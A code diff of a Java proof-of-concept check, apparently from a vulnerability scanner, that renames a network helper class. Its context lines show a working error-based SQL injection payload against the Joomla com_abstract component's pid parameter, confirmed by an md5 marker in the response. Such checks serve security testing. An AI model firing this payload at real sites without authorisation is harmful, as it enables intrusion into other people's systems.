@@ -19,7 +19,7 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.util.EntityUtils;
 
-import cn.com.sgcc.marki_with_maven.misc.Tools;
+import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;
 
 public class Joomla_Component_Abstract_v21_SQL_Injection implements IPocBase {
 
@@ -43,7 +43,7 @@ public class Joomla_Component_Abstract_v21_SQL_Injection implements IPocBase {
 		try {
 			String url = String.format("%s://%s:%s/index.php", serviceType.contains("https") ? "https":"http", ip, port );
 			HttpGet httpGet = new HttpGet(url);
-			customClient = new Tools().getCustomClient();
+			customClient = new NetWorkTools().getCustomClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
 			if ( resp.getStatusLine().getStatusCode() == 200 )
 			{
@@ -85,7 +85,7 @@ public class Joomla_Component_Abstract_v21_SQL_Injection implements IPocBase {
 		try {
 			String url = String.format("%s://%s:%s/index.php?option=com_abstract&view=conferences&layout=detail&pid=1+OR+1+GROUP+BY+CONCAT_WS(md5(233),0x3a,0x496873616e53656e63616e,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1", serviceType.contains("https") ? "https":"http", ip, port );
 			HttpGet httpGet = new HttpGet(url);
-			customClient = new Tools().getCustomClient();
+			customClient = new NetWorkTools().getCustomClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
 			String string = EntityUtils.toString(resp.getEntity());
 			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK && string.contains("e165421110ba03099a1c0393373c5b43") )
